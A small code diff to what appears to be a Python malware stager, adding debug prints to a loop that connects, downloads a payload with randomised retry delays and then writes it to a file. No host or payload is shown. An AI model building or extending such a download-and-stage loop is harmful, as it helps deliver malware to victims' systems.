@@ -36,6 +36,8 @@ def connect():
         except:
             time.sleep(random.randint(15, 30))
 
+    print(f"connected with sess: {sess}")
+
     return sess
 
 
@@ -58,12 +60,13 @@ def get_payload(sess):
 
 
 while True:
+    print("Getting payload inside stager")
     payload = get_payload(connect())
 
     if len(payload):
         break
 
-    print('Failed to download payload.\nRetrying...')
+    print('Failed to download payload.\nRetrying...\n')
     time.sleep(random.randint(15, 30))
 
 # write to file
